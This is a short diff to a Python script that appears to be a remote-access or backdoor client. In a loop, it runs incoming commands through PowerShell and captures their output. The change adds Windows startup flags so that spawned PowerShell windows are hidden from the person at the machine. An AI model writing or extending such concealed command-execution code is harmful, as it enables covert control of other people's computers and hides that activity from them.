@@ -219,10 +219,13 @@ while True:
                         output = ""
                 else:
                     Encoding = 'cp850'
-                    payload = "powershell /c " + command
-                    output = ''                    
+                    payload = "powershell /C " + command
+                    output = ''         
+
+                    startupinfo = subprocess.STARTUPINFO()
+                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW           
                     
-                    with subprocess.Popen(payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=Encoding) as Process:
+                    with subprocess.Popen(payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=Encoding, startupinfo=startupinfo) as Process:
                         for Line in Process.stdout:
                             addon = "\\n"
                             if Line.endswith(addon):
